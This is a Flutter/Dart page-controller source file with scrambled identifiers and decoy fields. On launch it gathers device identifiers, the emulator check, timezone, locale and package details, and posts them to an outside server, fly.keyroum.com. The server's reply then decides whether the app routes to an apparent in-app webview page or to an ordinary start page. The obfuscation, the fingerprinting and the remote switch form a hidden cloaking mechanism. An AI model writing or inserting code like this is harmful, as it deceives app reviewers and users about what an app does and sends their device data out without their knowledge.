import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void igkbxbakns() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/pointError");
  }
}

class PageLogic extends GetxController {

  var dgqpbrvjhn = RxBool(false);
  var nztvykjmf = RxBool(true);
  var charwf = RxString("");
  var selina = RxBool(false);
  var considine = RxBool(true);
  final hzroqsyie = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    igkbxbakns();
    super.onInit();
    inxbe();
  }


  Future<void> inxbe() async {

    selina.value = true;
    considine.value = true;
    nztvykjmf.value = false;

    hzroqsyie.post("https://fly.keyroum.com/yYwQBJ",data: await slgkcofd()).then((value) {
      var mrazcn = value.data["mrazcn"] as String;
      var azcmnb = value.data["azcmnb"] as bool;
      if (azcmnb) {
        charwf.value = mrazcn;
        mya();
      } else {
        morissette();
      }
    }).catchError((e) {
      nztvykjmf.value = true;
      considine.value = true;
      selina.value = false;
    });
  }

  Future<Map<String, dynamic>> slgkcofd() async {
    final DeviceInfoPlugin jscmf = DeviceInfoPlugin();
    PackageInfo byanu_ozdaj = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var kqjmxl = Platform.localeName;
    var qlFh = currentTimeZone;

    var bZCmM = byanu_ozdaj.packageName;
    var TPmXzg = byanu_ozdaj.version;
    var UuYzKba = byanu_ozdaj.buildNumber;

    var CQAUalFR = byanu_ozdaj.appName;
    var xiAYIHE = "";
    var YWVLOo  = "";
    var uvChjV = "";
    var hollyDaniel = "";
    var jazminLynch = "";
    var monaMarks = "";
    var malindaErnser = "";
    var arturoRitchie = "";
    var kevenQuigley = "";
    var lennyDeckow = "";


    var FzBWN = "";
    var ClpxtR = false;

    if (GetPlatform.isAndroid) {
      FzBWN = "android";
      var abvymqwzor = await jscmf.androidInfo;

      uvChjV = abvymqwzor.brand;

      xiAYIHE  = abvymqwzor.model;
      YWVLOo = abvymqwzor.id;

      ClpxtR = abvymqwzor.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      FzBWN = "ios";
      var dxlhftwbqu = await jscmf.iosInfo;
      uvChjV = dxlhftwbqu.name;
      xiAYIHE = dxlhftwbqu.model;

      YWVLOo = dxlhftwbqu.identifierForVendor ?? "";
      ClpxtR  = dxlhftwbqu.isPhysicalDevice;
    }
    var res = {
      "CQAUalFR": CQAUalFR,
      "qlFh": qlFh,
      "UuYzKba": UuYzKba,
      "TPmXzg": TPmXzg,
      "xiAYIHE": xiAYIHE,
      "uvChjV": uvChjV,
      "YWVLOo": YWVLOo,
      "kqjmxl": kqjmxl,
      "arturoRitchie" : arturoRitchie,
      "kevenQuigley" : kevenQuigley,
      "FzBWN": FzBWN,
      "ClpxtR": ClpxtR,
      "hollyDaniel" : hollyDaniel,
      "bZCmM": bZCmM,
      "jazminLynch" : jazminLynch,
      "monaMarks" : monaMarks,
      "malindaErnser" : malindaErnser,
      "lennyDeckow" : lennyDeckow,

    };
    return res;
  }

  Future<void> morissette() async {
    Get.offAllNamed("/pointFirst");
  }

  Future<void> mya() async {
    Get.offAllNamed("/pointCel");
  }

}
